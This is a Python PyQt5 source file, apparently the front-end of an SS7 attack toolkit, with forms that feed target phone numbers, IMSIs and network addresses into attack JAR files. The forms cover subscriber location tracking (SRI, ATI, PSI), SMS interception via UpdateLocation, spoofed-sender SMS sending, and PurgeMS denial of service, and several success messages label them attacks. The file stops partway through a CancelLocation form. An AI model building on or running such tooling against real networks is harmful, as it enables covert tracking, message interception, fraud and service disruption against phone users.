import sys
import os
import subprocess
from subprocess import check_call
from PyQt5.QtWidgets import QApplication, QWidget, QCheckBox,  QMessageBox, QLabel, QLineEdit, QPushButton, QVBoxLayout, QFormLayout, QRadioButton, QHBoxLayout, QGroupBox

purge_path = os.path.join(os.getcwd(), 'ss7/attacks/dos/prgms')
simsi_path = os.path.join(os.getcwd(), 'ss7/attacks/fraud/simsi')
mtsms_path = os.path.join(os.getcwd(), 'ss7/attacks/fraud/mtsms')
cl_path = os.path.join(os.getcwd(), 'ss7/attacks/fraud/cl')
ul_path = os.path.join(os.getcwd(), 'ss7/attacks/interception/ul')
sri_path = os.path.join(os.getcwd(), 'ss7/attacks/tracking/sri')
srism_path = os.path.join(os.getcwd(), 'ss7/attacks/tracking/srism')
psi_path = os.path.join(os.getcwd(), 'ss7/attacks/tracking/psi')
ati_path = os.path.join(os.getcwd(), 'ss7/attacks/tracking/ati')
srigprs_path = os.path.join(os.getcwd(), 'ss7/attacks/tracking/srigprs')


class SRIForm(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('SRI Form')
        self.setGeometry(100, 100, 400, 300)

        self.form_layout = QFormLayout()

        self.client_pc_input = QLineEdit()
        self.peer_pc_input = QLineEdit()
        self.client_ip_input = QLineEdit()
        self.client_port_input = QLineEdit()
        self.peer_ip_input = QLineEdit()
        self.peer_port_input = QLineEdit()

        self.form_layout.addRow('Client PC:', self.client_pc_input)
        self.form_layout.addRow('Peer PC:', self.peer_pc_input)
        self.form_layout.addRow('Client IP:', self.client_ip_input)
        self.form_layout.addRow('Client Port:', self.client_port_input)
        self.form_layout.addRow('Peer IP:', self.peer_ip_input)
        self.form_layout.addRow('Peer Port:', self.peer_port_input)

        self.network_indicator_group = QGroupBox('Network Indicator')
        self.radio_international = QRadioButton('International')
        self.radio_national = QRadioButton('National')

        self.radio_international.setChecked(True)
        self.network_indicator_group.setLayout(QHBoxLayout())
        self.network_indicator_group.layout().addWidget(self.radio_international)
        self.network_indicator_group.layout().addWidget(self.radio_national)
        self.form_layout.addRow(self.network_indicator_group)

        self.target_msisdn_input = QLineEdit()
        self.msc_gt_input = QLineEdit()

        self.form_layout.addRow('Target\'s MSISDN:', self.target_msisdn_input)
        self.form_layout.addRow('MSC-GT:', self.msc_gt_input)

        self.submit_button = QPushButton('Submit')
        self.submit_button.clicked.connect(self.submit_form)

        layout = QVBoxLayout()
        layout.addLayout(self.form_layout)
        layout.addWidget(self.submit_button)

        self.setLayout(layout)

    def submit_form(self):
        client_pc = self.client_pc_input.text()
        peer_pc = self.peer_pc_input.text()
        client_ip = self.client_ip_input.text()
        client_port = self.client_port_input.text()
        peer_ip = self.peer_ip_input.text()
        peer_port = self.peer_port_input.text()
        network_indicator = '0' if self.radio_international.isChecked() else '2'
        target_msisdn = self.target_msisdn_input.text()
        msc_gt = self.msc_gt_input.text()

        jar_file = 'SendRoutingInfo.jar'
        try:
            java_command = ['java', '-jar',
                            str(os.path.join(sri_path, jar_file))]
            print(java_command)
            java_process = subprocess.Popen(
                java_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            # Send answers to the Java program in order
            java_process.stdin.write(client_pc + '\n')
            java_process.stdin.write(peer_pc + '\n')
            java_process.stdin.write(client_ip + '\n')
            java_process.stdin.write(client_port + '\n')
            java_process.stdin.write(peer_ip + '\n')
            java_process.stdin.write(peer_port + '\n')
            java_process.stdin.write(network_indicator + '\n')
            java_process.stdin.write(target_msisdn + '\n')
            java_process.stdin.write(msc_gt + '\n')
            java_process.stdin.flush()
            java_output, _ = java_process.communicate()
            print(java_output)
            if java_output == 0:
                QMessageBox.information(
                    self, 'SendRoutingInfo Attack', f"SendRoutingInfo Attack executed successfully. \n{str(java_output)}")
            else:
                QMessageBox.information(
                    self, 'Executing Error', f"Seems like there is a wrong field: \n{str(java_output)}")
        except Exception as e:
            QMessageBox.critical(
                self, 'Error', f"SendRoutingInfo Failed to Launch: {str(e)}")

        # Here you can process the form data as needed
        print(f'Client PC: {client_pc}')
        print(f'Peer PC: {peer_pc}')
        print(f'Client IP: {client_ip}')
        print(f'Client Port: {client_port}')
        print(f'Peer IP: {peer_ip}')
        print(f'Peer Port: {peer_port}')
        print(f'Network Indicator: {network_indicator}')
        print(f'Target\'s MSISDN: {target_msisdn}')
        print(f'MSC-GT: {msc_gt}')


class SRISMForm(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('SRISM Form')
        self.setGeometry(100, 100, 400, 300)

        self.form_layout = QFormLayout()

        self.client_pc_input = QLineEdit()
        self.peer_pc_input = QLineEdit()
        self.client_ip_input = QLineEdit()
        self.client_port_input = QLineEdit()
        self.peer_ip_input = QLineEdit()
        self.peer_port_input = QLineEdit()

        self.form_layout.addRow('Client PC:', self.client_pc_input)
        self.form_layout.addRow('Peer PC:', self.peer_pc_input)
        self.form_layout.addRow('Client IP:', self.client_ip_input)
        self.form_layout.addRow('Client Port:', self.client_port_input)
        self.form_layout.addRow('Peer IP:', self.peer_ip_input)
        self.form_layout.addRow('Peer Port:', self.peer_port_input)

        self.network_indicator_group = QGroupBox('Network Indicator')
        self.radio_international = QRadioButton('International')
        self.radio_national = QRadioButton('National')

        self.radio_international.setChecked(True)
        self.network_indicator_group.setLayout(QHBoxLayout())
        self.network_indicator_group.layout().addWidget(self.radio_international)
        self.network_indicator_group.layout().addWidget(self.radio_national)
        self.form_layout.addRow(self.network_indicator_group)

        self.remote_hlr_input = QLineEdit()
        self.target_msisdn_input = QLineEdit()
        self.msc_gt_input = QLineEdit()
        self.smsc_gt_input = QLineEdit()

        self.form_layout.addRow('Remote HLR:', self.remote_hlr_input)
        self.form_layout.addRow("Target's MSISDN:", self.target_msisdn_input)
        self.form_layout.addRow('MSC-GT:', self.msc_gt_input)
        self.form_layout.addRow('SMSC-GT:', self.smsc_gt_input)

        self.submit_button = QPushButton('Submit')
        self.submit_button.clicked.connect(self.submit_form)

        layout = QVBoxLayout()
        layout.addLayout(self.form_layout)
        layout.addWidget(self.submit_button)

        self.setLayout(layout)

    def submit_form(self):
        client_pc = self.client_pc_input.text()
        peer_pc = self.peer_pc_input.text()
        client_ip = self.client_ip_input.text()
        client_port = self.client_port_input.text()
        peer_ip = self.peer_ip_input.text()
        peer_port = self.peer_port_input.text()
        network_indicator = '0' if self.radio_international.isChecked() else '2'
        remote_hlr = self.remote_hlr_input.text()
        target_msisdn = self.target_msisdn_input.text()
        msc_gt = self.msc_gt_input.text()
        smsc_gt = self.smsc_gt_input.text()

        jar_file = 'SendRoutingInfoForSM.jar'
        try:
            java_command = ['java', '-jar',
                            str(os.path.join(srism_path, jar_file))]
            print(java_command)
            java_process = subprocess.Popen(
                java_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            java_process.stdin.write(client_pc + '\n')
            java_process.stdin.write(peer_pc + '\n')
            java_process.stdin.write(client_ip + '\n')
            java_process.stdin.write(client_port + '\n')
            java_process.stdin.write(peer_ip + '\n')
            java_process.stdin.write(peer_port + '\n')
            java_process.stdin.write(network_indicator + '\n')
            java_process.stdin.write(remote_hlr + '\n')
            java_process.stdin.write(target_msisdn + '\n')
            java_process.stdin.write(msc_gt + '\n')
            java_process.stdin.write(smsc_gt + '\n')
            java_process.stdin.flush()
            java_output, _ = java_process.communicate()
            print(java_output)
            if java_output == 0:
                QMessageBox.information(self, 'SendRoutingInfoForSM Attack',
                                        f"SendRoutingInfoForSM Attack executed successfully. \n{str(java_output)}")
            else:
                QMessageBox.information(
                    self, 'Executing Error', f"Seems like there is a wrong field: \n{str(java_output)}")
        except Exception as e:
            QMessageBox.critical(
                self, 'Error', f"SendRoutingInfoForSM Failed to Launch: {str(e)}")

        print(f'Client PC: {client_pc}')
        print(f'Peer PC: {peer_pc}')
        print(f'Client IP: {client_ip}')
        print(f'Client Port: {client_port}')
        print(f'Peer IP: {peer_ip}')
        print(f'Peer Port: {peer_port}')
        print(f'Network Indicator: {network_indicator}')
        print(f'Remote HLR: {remote_hlr}')
        print(f"Target's MSISDN: {target_msisdn}")
        print(f'MSC-GT: {msc_gt}')
        print(f'SMSC-GT: {smsc_gt}')


class ATIForm(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('ATI Form')
        self.setGeometry(100, 100, 400, 300)

        self.form_layout = QFormLayout()

        self.client_pc_input = QLineEdit()
        self.peer_pc_input = QLineEdit()
        self.client_ip_input = QLineEdit()
        self.client_port_input = QLineEdit()
        self.peer_ip_input = QLineEdit()
        self.peer_port_input = QLineEdit()

        self.form_layout.addRow('Client PC:', self.client_pc_input)
        self.form_layout.addRow('Peer PC:', self.peer_pc_input)
        self.form_layout.addRow('Client IP:', self.client_ip_input)
        self.form_layout.addRow('Client Port:', self.client_port_input)
        self.form_layout.addRow('Peer IP:', self.peer_ip_input)
        self.form_layout.addRow('Peer Port:', self.peer_port_input)

        self.network_indicator_group = QGroupBox('Network Indicator')
        self.radio_international = QRadioButton('International')
        self.radio_national = QRadioButton('National')

        self.radio_international.setChecked(True)
        self.network_indicator_group.setLayout(QHBoxLayout())
        self.network_indicator_group.layout().addWidget(self.radio_international)
        self.network_indicator_group.layout().addWidget(self.radio_national)
        self.form_layout.addRow(self.network_indicator_group)

        self.remote_hlr_input = QLineEdit()
        self.target_msisdn_input = QLineEdit()
        self.gt_input = QLineEdit()

        self.form_layout.addRow('Remote HLR:', self.remote_hlr_input)
        self.form_layout.addRow("Target's MSISDN:", self.target_msisdn_input)
        self.form_layout.addRow('GT:', self.gt_input)

        self.submit_button = QPushButton('Submit')
        self.submit_button.clicked.connect(self.submit_form)

        layout = QVBoxLayout()
        layout.addLayout(self.form_layout)
        layout.addWidget(self.submit_button)

        self.setLayout(layout)

    def submit_form(self):
        client_pc = self.client_pc_input.text()
        peer_pc = self.peer_pc_input.text()
        client_ip = self.client_ip_input.text()
        client_port = self.client_port_input.text()
        peer_ip = self.peer_ip_input.text()
        peer_port = self.peer_port_input.text()
        network_indicator = '0' if self.radio_international.isChecked() else '2'
        remote_hlr = self.remote_hlr_input.text()
        target_msisdn = self.target_msisdn_input.text()
        gt = self.gt_input.text()

        jar_file = 'AnyTimeInterrogation.jar'
        try:
            java_command = ['java', '-jar',
                            str(os.path.join(ati_path, jar_file))]
            print(java_command)
            java_process = subprocess.Popen(
                java_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            java_process.stdin.write(client_pc + '\n')
            java_process.stdin.write(peer_pc + '\n')
            java_process.stdin.write(client_ip + '\n')
            java_process.stdin.write(client_port + '\n')
            java_process.stdin.write(peer_ip + '\n')
            java_process.stdin.write(peer_port + '\n')
            java_process.stdin.write(network_indicator + '\n')
            java_process.stdin.write(remote_hlr + '\n')
            java_process.stdin.write(target_msisdn + '\n')
            java_process.stdin.write(gt + '\n')
            java_process.stdin.flush()
            java_output, _ = java_process.communicate()
            print(java_output)
            if java_output == 0:
                QMessageBox.information(self, 'AnyTimeInterrogation Attack',
                                        f"AnyTimeInterrogation executed successfully. \n{str(java_output)}")
            else:
                QMessageBox.information(
                    self, 'Executing Error', f"Seems like there is a wrong field: \n{str(java_output)}")
        except Exception as e:
            QMessageBox.critical(
                self, 'Error', f"AnyTimeInterrogation Failed to Launch: {str(e)}")
            print(e)


class PSIForm(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('PSI Form')
        self.setGeometry(100, 100, 800, 500)

        self.form_layout = QFormLayout()

        self.client_pc_input = QLineEdit()
        self.peer_pc_input = QLineEdit()
        self.client_ip_input = QLineEdit()
        self.client_port_input = QLineEdit()
        self.peer_ip_input = QLineEdit()
        self.peer_port_input = QLineEdit()

        self.form_layout.addRow('Client PC:', self.client_pc_input)
        self.form_layout.addRow('Peer PC:', self.peer_pc_input)
        self.form_layout.addRow('Client IP:', self.client_ip_input)
        self.form_layout.addRow('Client Port:', self.client_port_input)
        self.form_layout.addRow('Peer IP:', self.peer_ip_input)
        self.form_layout.addRow('Peer Port:', self.peer_port_input)

        self.network_indicator_group = QGroupBox('Network Indicator')
        self.radio_international = QRadioButton('International')
        self.radio_national = QRadioButton('National')

        self.radio_international.setChecked(True)
        self.network_indicator_group.setLayout(QHBoxLayout())
        self.network_indicator_group.layout().addWidget(self.radio_international)
        self.network_indicator_group.layout().addWidget(self.radio_national)
        self.form_layout.addRow(self.network_indicator_group)

        self.remote_hlr_input = QLineEdit()
        self.target_msisdn_input = QLineEdit()
        self.gt_input = QLineEdit()

        self.form_layout.addRow('Remote VLR GT:', self.remote_hlr_input)
        self.form_layout.addRow(
            "Target's IMSI(15-16 Digits):", self.target_msisdn_input)
        self.form_layout.addRow('HLR GT:', self.gt_input)

        self.submit_button = QPushButton('Submit')
        self.submit_button.clicked.connect(self.submit_form)

        layout = QVBoxLayout()
        layout.addLayout(self.form_layout)
        layout.addWidget(self.submit_button)

        self.setLayout(layout)

    def submit_form(self):
        client_pc = self.client_pc_input.text()
        peer_pc = self.peer_pc_input.text()
        client_ip = self.client_ip_input.text()
        client_port = self.client_port_input.text()
        peer_ip = self.peer_ip_input.text()
        peer_port = self.peer_port_input.text()
        network_indicator = '0' if self.radio_international.isChecked() else '2'
        remote_hlr = self.remote_hlr_input.text()
        target_msisdn = self.target_msisdn_input.text()
        gt = self.gt_input.text()

        jar_file = 'ProvideSubscriberInfo.jar'
        try:
            java_command = ['java', '-jar',
                            str(os.path.join(psi_path, jar_file))]
            print(java_command)
            java_process = subprocess.Popen(
                java_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            java_process.stdin.write(client_pc + '\n')
            java_process.stdin.write(peer_pc + '\n')
            java_process.stdin.write(client_ip + '\n')
            java_process.stdin.write(client_port + '\n')
            java_process.stdin.write(peer_ip + '\n')
            java_process.stdin.write(peer_port + '\n')
            java_process.stdin.write(network_indicator + '\n')
            java_process.stdin.write(remote_hlr + '\n')
            java_process.stdin.write(target_msisdn + '\n')
            java_process.stdin.write(gt + '\n')
            java_process.stdin.flush()
            java_output, _ = java_process.communicate()
            print(java_output)
            if java_output == 0:
                QMessageBox.information(self, 'ProvideSubscriberInfo Attack',
                                        f"ProvideSubscriberInfo Attack executed successfully. \n{str(java_output)}")
            else:
                QMessageBox.information(
                    self, 'Executing Error', f"Seems like there is a wrong field: \n{str(java_output)}")
        except Exception as e:
            QMessageBox.critical(
                self, 'Error', f"ProvideSubscriberInfo Failed to Launch: {str(e)}")
            print(e)


class ULForm(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('UL Form')
        self.setGeometry(100, 100, 600, 400)

        self.form_layout = QFormLayout()

        self.client_pc_input = QLineEdit()
        self.peer_pc_input = QLineEdit()
        self.client_ip_input = QLineEdit()
        self.client_port_input = QLineEdit()
        self.peer_ip_input = QLineEdit()
        self.peer_port_input = QLineEdit()

        self.form_layout.addRow('Client PC:', self.client_pc_input)
        self.form_layout.addRow('Peer PC:', self.peer_pc_input)
        self.form_layout.addRow('Client IP:', self.client_ip_input)
        self.form_layout.addRow('Client Port:', self.client_port_input)
        self.form_layout.addRow('Peer IP:', self.peer_ip_input)
        self.form_layout.addRow('Peer Port:', self.peer_port_input)

        self.network_indicator_group = QGroupBox('Network Indicator')
        self.radio_international = QRadioButton('International')
        self.radio_national = QRadioButton('National')

        self.radio_international.setChecked(True)
        self.network_indicator_group.setLayout(QHBoxLayout())
        self.network_indicator_group.layout().addWidget(self.radio_international)
        self.network_indicator_group.layout().addWidget(self.radio_national)
        self.form_layout.addRow(self.network_indicator_group)

        self.remote_hlr_input = QLineEdit()
        self.target_msisdn_input = QLineEdit()
        self.gt_input = QLineEdit()

        self.form_layout.addRow('Target\' ISMI:', self.remote_hlr_input)
        self.form_layout.addRow(
            "Target's ISMI in GT Format(mcc+mnc+msin->cc-ndc-msin):", self.target_msisdn_input)
        self.form_layout.addRow('GT:', self.gt_input)

        self.forward_sms_checkbox = QCheckBox(
            "Forward the intercepted SMS to target")

        self.form_layout.addRow(self.forward_sms_checkbox)
        self.Current_MSC_GT = QLineEdit()
        self.form_layout.addRow(
            "Target's Current MSC GT:", self.Current_MSC_GT)
        self.submit_button = QPushButton('Submit')
        self.submit_button.clicked.connect(self.submit_form)

        layout = QVBoxLayout()
        layout.addLayout(self.form_layout)
        layout.addWidget(self.submit_button)

        self.setLayout(layout)

    def submit_form(self):
        client_pc = self.client_pc_input.text()
        peer_pc = self.peer_pc_input.text()
        client_ip = self.client_ip_input.text()
        client_port = self.client_port_input.text()
        peer_ip = self.peer_ip_input.text()
        peer_port = self.peer_port_input.text()
        network_indicator = '0' if self.radio_international.isChecked() else '2'
        remote_hlr = self.remote_hlr_input.text()
        target_msisdn = self.target_msisdn_input.text()
        gt = self.gt_input.text()
        forward_sms = 'y' if self.forward_sms_checkbox.isChecked() else 'n'
        current_MSC_GT = self.Current_MSC_GT.text()

        jar_file = 'UpdateLocation.jar'
        try:
            java_command = ['java', '-jar',
                            str(os.path.join(ul_path, jar_file))]
            print(java_command)
            java_process = subprocess.Popen(
                java_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            java_process.stdin.write(client_pc + '\n')
            java_process.stdin.write(peer_pc + '\n')
            java_process.stdin.write(client_ip + '\n')
            java_process.stdin.write(client_port + '\n')
            java_process.stdin.write(peer_ip + '\n')
            java_process.stdin.write(peer_port + '\n')
            java_process.stdin.write(network_indicator + '\n')
            java_process.stdin.write(remote_hlr + '\n')
            java_process.stdin.write(target_msisdn + '\n')
            java_process.stdin.write(gt + '\n')
            java_process.stdin.write(forward_sms + '\n')
            java_process.stdin.write(current_MSC_GT + '\n')
            java_process.stdin.flush()
            java_output, _ = java_process.communicate()
            print(java_output)
            if java_output == 0:
                QMessageBox.information(
                    self, 'UpdateLocation Attack', f"UpdateLocation Attack executed successfully. \n{str(java_output)}")
            else:
                QMessageBox.information(
                    self, 'Executing Error', f"Seems like there is a wrong field: \n{str(java_output)}")
        except Exception as e:
            QMessageBox.critical(
                self, 'Error', f"UpdateLocation Failed to Launch: {str(e)}")
            print(e)


class IMSIForm(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('ISMI Form')
        self.setGeometry(100, 100, 600, 400)

        self.form_layout = QFormLayout()

        self.client_pc_input = QLineEdit()
        self.peer_pc_input = QLineEdit()
        self.client_ip_input = QLineEdit()
        self.client_port_input = QLineEdit()
        self.peer_ip_input = QLineEdit()
        self.peer_port_input = QLineEdit()

        self.form_layout.addRow('Client PC:', self.client_pc_input)
        self.form_layout.addRow('Peer PC:', self.peer_pc_input)
        self.form_layout.addRow('Client IP:', self.client_ip_input)
        self.form_layout.addRow('Client Port:', self.client_port_input)
        self.form_layout.addRow('Peer IP:', self.peer_ip_input)
        self.form_layout.addRow('Peer Port:', self.peer_port_input)

        self.network_indicator_group = QGroupBox('Network Indicator')
        self.radio_international = QRadioButton('International')
        self.radio_national = QRadioButton('National')

        self.radio_international.setChecked(True)
        self.network_indicator_group.setLayout(QHBoxLayout())
        self.network_indicator_group.layout().addWidget(self.radio_international)
        self.network_indicator_group.layout().addWidget(self.radio_national)
        self.form_layout.addRow(self.network_indicator_group)

        self.ISMI_input = QLineEdit()
        self.form_layout.addRow('ISMI:', self.ISMI_input)
        self.gt_input = QLineEdit()
        self.form_layout.addRow('GT:', self.gt_input)
        self.submit_button = QPushButton('Submit')
        self.submit_button.clicked.connect(self.submit_form)

        layout = QVBoxLayout()
        layout.addLayout(self.form_layout)
        layout.addWidget(self.submit_button)

        self.setLayout(layout)

    def submit_form(self):
        client_pc = self.client_pc_input.text()
        peer_pc = self.peer_pc_input.text()
        client_ip = self.client_ip_input.text()
        client_port = self.client_port_input.text()
        peer_ip = self.peer_ip_input.text()
        peer_port = self.peer_port_input.text()
        network_indicator = '0' if self.radio_international.isChecked() else '1'
        ismi = self.ISMI_input.text()
        gt = self.gt_input.text()

        jar_file = 'SendIMSI.jar'
        try:
            java_command = ['java', '-jar',
                            str(os.path.join(simsi_path, jar_file))]
            print(java_command)
            java_process = subprocess.Popen(
                java_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            java_process.stdin.write(client_pc + '\n')
            java_process.stdin.write(peer_pc + '\n')
            java_process.stdin.write(client_ip + '\n')
            java_process.stdin.write(client_port + '\n')
            java_process.stdin.write(peer_ip + '\n')
            java_process.stdin.write(peer_port + '\n')
            java_process.stdin.write(network_indicator + '\n')
            java_process.stdin.write(ismi + '\n')
            java_process.stdin.write(gt + '\n')
            java_process.stdin.flush()
            java_output, _ = java_process.communicate()
            print(java_output)
            if java_output == 0:
                QMessageBox.information(
                    self, 'SendIMSI Attack', f"SendIMSI Attack executed successfully. \n{str(java_output)}")
            else:
                QMessageBox.information(
                    self, 'Executing Error', f"Seems like there is a wrong field: \n{str(java_output)}")
        except Exception as e:
            QMessageBox.critical(
                self, 'Error', f"SendIMSI Failed to Launch: {str(e)}")
            print(e)


class MTSMSForm(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('MTSMS Form')
        self.setGeometry(100, 100, 600, 400)

        self.form_layout = QFormLayout()

        self.client_pc_input = QLineEdit()
        self.peer_pc_input = QLineEdit()
        self.client_ip_input = QLineEdit()
        self.client_port_input = QLineEdit()
        self.peer_ip_input = QLineEdit()
        self.peer_port_input = QLineEdit()

        self.form_layout.addRow('Client PC:', self.client_pc_input)
        self.form_layout.addRow('Peer PC:', self.peer_pc_input)
        self.form_layout.addRow('Client IP:', self.client_ip_input)
        self.form_layout.addRow('Client Port:', self.client_port_input)
        self.form_layout.addRow('Peer IP:', self.peer_ip_input)
        self.form_layout.addRow('Peer Port:', self.peer_port_input)

        self.network_indicator_group = QGroupBox('Network Indicator')
        self.radio_international = QRadioButton('International')
        self.radio_national = QRadioButton('National')

        self.radio_international.setChecked(True)
        self.network_indicator_group.setLayout(QHBoxLayout())
        self.network_indicator_group.layout().addWidget(self.radio_international)
        self.network_indicator_group.layout().addWidget(self.radio_national)
        self.form_layout.addRow(self.network_indicator_group)

        self.IMSI_input = QLineEdit()
        self.form_layout.addRow('IMSI:', self.IMSI_input)
        self.MSC_input = QLineEdit()
        self.form_layout.addRow('MSC:', self.MSC_input)
        self.GT_input = QLineEdit()
        self.form_layout.addRow('Your GT:', self.GT_input)
        self.Spoofed_SMSC_GT_input = QLineEdit()
        self.form_layout.addRow('Spoofed SMSC GT:', self.Spoofed_SMSC_GT_input)
        self.sender_name_input = QLineEdit()
        self.form_layout.addRow(
            'Spoofed sender Name (i.e Facebook):', self.sender_name_input)
        self.sms_input = QLineEdit()
        self.form_layout.addRow('SMS Content:', self.sms_input)
        self.submit_button = QPushButton('Submit')
        self.submit_button.clicked.connect(self.submit_form)

        layout = QVBoxLayout()
        layout.addLayout(self.form_layout)
        layout.addWidget(self.submit_button)

        self.setLayout(layout)

    def submit_form(self):
        client_pc = self.client_pc_input.text()
        peer_pc = self.peer_pc_input.text()
        client_ip = self.client_ip_input.text()
        client_port = self.client_port_input.text()
        peer_ip = self.peer_ip_input.text()
        peer_port = self.peer_port_input.text()
        network_indicator = '0' if self.radio_international.isChecked() else '2'
        imsi = self.IMSI_input.text()
        msc = self.MSC_input.text()
        gt = self.GT_input.text()
        spoofedSMSC = self.Spoofed_SMSC_GT_input.text()
        name = self.sender_name_input.text()
        sms = self.sms_input.text()

        jar_file = 'MTForwardSMS.jar'
        try:
            java_command = ['java', '-jar',
                            str(os.path.join(mtsms_path, jar_file))]
            print(java_command)
            java_process = subprocess.Popen(
                java_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            java_process.stdin.write(client_pc + '\n')
            java_process.stdin.write(peer_pc + '\n')
            java_process.stdin.write(client_ip + '\n')
            java_process.stdin.write(client_port + '\n')
            java_process.stdin.write(peer_ip + '\n')
            java_process.stdin.write(peer_port + '\n')
            java_process.stdin.write(network_indicator + '\n')
            java_process.stdin.write(imsi + '\n')
            java_process.stdin.write(msc + '\n')
            java_process.stdin.write(gt + '\n')
            java_process.stdin.write(spoofedSMSC + '\n')
            java_process.stdin.write(name + '\n')
            java_process.stdin.write(sms + '\n')
            java_process.stdin.flush()
            java_output, _ = java_process.communicate()
            print(java_output)
            if java_output == 0:
                QMessageBox.information(
                    self, 'MTForwardSMS Attack', f"MTForwardSMS Attack executed successfully. \n{str(java_output)}")
            else:
                QMessageBox.information(
                    self, 'Executing Error', f"Seems like there is a wrong field: \n{str(java_output)}")
        except Exception as e:
            QMessageBox.critical(
                self, 'Error', f"MTForwardSMS Failed to Launch: {str(e)}")
            print(e)


class PurgeForm(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Purge Form')
        self.setGeometry(100, 100, 600, 400)

        self.form_layout = QFormLayout()

        self.client_pc_input = QLineEdit()
        self.peer_pc_input = QLineEdit()
        self.client_ip_input = QLineEdit()
        self.client_port_input = QLineEdit()
        self.peer_ip_input = QLineEdit()
        self.peer_port_input = QLineEdit()

        self.form_layout.addRow('Client PC:', self.client_pc_input)
        self.form_layout.addRow('Peer PC:', self.peer_pc_input)
        self.form_layout.addRow('Client IP:', self.client_ip_input)
        self.form_layout.addRow('Client Port:', self.client_port_input)
        self.form_layout.addRow('Peer IP:', self.peer_ip_input)
        self.form_layout.addRow('Peer Port:', self.peer_port_input)

        self.network_indicator_group = QGroupBox('Network Indicator')
        self.radio_international = QRadioButton('International')
        self.radio_national = QRadioButton('National')

        self.radio_international.setChecked(True)
        self.network_indicator_group.setLayout(QHBoxLayout())
        self.network_indicator_group.layout().addWidget(self.radio_international)
        self.network_indicator_group.layout().addWidget(self.radio_national)
        self.form_layout.addRow(self.network_indicator_group)

        self.IMSI_input = QLineEdit()
        self.form_layout.addRow(
            'Target\'s IMSI(s) (Space Separated):', self.IMSI_input)
        self.MSC_GTinput = QLineEdit()
        self.form_layout.addRow(
            'Target\'s IMSI(s) in GT Format(mcc+mnc+msin-->cc+ndc+msin):', self.MSC_GTinput)
        self.GT_input = QLineEdit()
        self.form_layout.addRow('Your GT:', self.GT_input)
        self.submit_button = QPushButton('Submit')
        self.submit_button.clicked.connect(self.submit_form)

        layout = QVBoxLayout()
        layout.addLayout(self.form_layout)
        layout.addWidget(self.submit_button)

        self.setLayout(layout)

    def submit_form(self):
        client_pc = self.client_pc_input.text()
        peer_pc = self.peer_pc_input.text()
        client_ip = self.client_ip_input.text()
        client_port = self.client_port_input.text()
        peer_ip = self.peer_ip_input.text()
        peer_port = self.peer_port_input.text()
        network_indicator = '0' if self.radio_international.isChecked() else '2'
        imsi = self.IMSI_input.text()
        msc = self.MSC_GTinput.text()
        gt = self.GT_input.text()

        jar_file = 'PurgeMS.jar'
        try:
            java_command = ['java', '-jar',
                            str(os.path.join(purge_path, jar_file))]
            print(java_command)
            java_process = subprocess.Popen(
                java_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            java_process.stdin.write(client_pc + '\n')
            java_process.stdin.write(peer_pc + '\n')
            java_process.stdin.write(client_ip + '\n')
            java_process.stdin.write(client_port + '\n')
            java_process.stdin.write(peer_ip + '\n')
            java_process.stdin.write(peer_port + '\n')
            java_process.stdin.write(network_indicator + '\n')
            java_process.stdin.write(imsi + '\n')
            java_process.stdin.write(msc + '\n')
            java_process.stdin.write(gt + '\n')
            java_process.stdin.flush()
            java_output, _ = java_process.communicate()
            print(java_output)
            if java_output == 0:
                QMessageBox.information(
                    self, 'PurgeMS DoS Attack', f"PurgeMS DoS executed successfully. \n{str(java_output)}")
            else:
                QMessageBox.information(
                    self, 'Executing Error', f"Seems like there is a wrong field: \n{str(java_output)}")
        except Exception as e:
            QMessageBox.critical(
                self, 'Error', f"PurgeMS Failed to Launch: {str(e)}")
            print(e)


class CLForm(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('CancelLocation Form')
        self.setGeometry(100, 100, 600, 400)

        self.form_layout = QFormLayout()

        self.client_pc_input = QLineEdit()
        self.peer_pc_input = QLineEdit()
        self.client_ip_input = QLineEdit()
        self.client_port_input = QLineEdit()
        self.peer_ip_input = QLineEdit()
        self.peer_port_input = QLineEdit()

        self.form_layout.addRow('Client PC:', self.client_pc_input)
        self.form_layout.addRow('Peer PC:', self.peer_pc_input)
        self.form_layout.addRow('Client IP:', self.client_ip_input)
        self.form_layout.addRow('Client Port:', self.client_port_input)
        self.form_layout.addRow('Peer IP:', self.peer_ip_input)
        self.form_layout.addRow('Peer Port:', self.peer_port_input)

        self.network_indicator_group = QGroupBox('Network Indicator')
        self.radio_international = QRadioButton('International')
        self.radio_national = QRadioButton('National')

        self.radio_international.setChecked(True)
        self.network_indicator_group.setLayout(QHBoxLayout())
        self.network_indicator_group.layout().addWidget(self.radio_international)
        self.network_indicator_group.layout().addWidget(self.radio_national)
        self.form_layout.addRow(self.network_indicator_group)

        self.IMSI_input = QLineEdit()
        self.form_layout.addRow(
            'Target\'s IMSI(s) (Space Separated):', self.IMSI_input)
        self.MSC_GTinput = QLineEdit()
        self.form_layout.addRow(
            'Target\'s IMSI(s) in GT Format(mcc+mnc+msin-->cc+ndc+msin):', self.MSC_GTinput)
        self.GT_input = QLineEdit()
        self.form_layout.addRow('Your GT:', self.GT_input)
        self.submit_button = QPushButton('Submit')
        self.submit_button.clicked.connect(self.submit_form)

